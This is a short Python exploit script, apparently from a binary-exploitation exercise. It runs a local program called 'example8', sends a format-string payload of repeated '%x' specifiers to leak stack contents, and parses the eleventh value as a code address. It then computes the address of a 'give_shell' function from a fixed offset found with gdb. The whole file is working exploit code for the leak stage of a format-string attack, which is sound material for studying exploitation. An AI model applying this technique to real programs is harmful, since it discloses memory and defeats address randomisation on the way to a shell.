#!/usr/bin/python
'''
example8_leak.py
'''
import struct
import subprocess
import os
import pty

def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise

def read(fd, n):
  return os.read(fd, n)

def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
    proc.stdin.flush()
  except:
    raise

def write(proc, data):
  try:
    proc.stdin.write(data)
    proc.stdin.flush()
  except:
    raise

def p32(val):
  return struct.pack("<I", val)

def u32(data):
  return struct.unpack("<I", data)[0]

out_r, out_w = pty.openpty()
s = subprocess.Popen("./example8", stdin=subprocess.PIPE, stdout=out_w)

print(read(out_r, 10)) 
writeline(s, "%x_"*11)

fsb_data = readline(out_r)
datas = fsb_data.split("_")
code_addr = int(datas[10], 16)            # get 11th %x output

print("vuln_ret_addr @ " + hex(code_addr))

give_shell = code_addr - 0xee  #calculated from gdb and example executable file

print("give_shell @ " + hex(give_shell))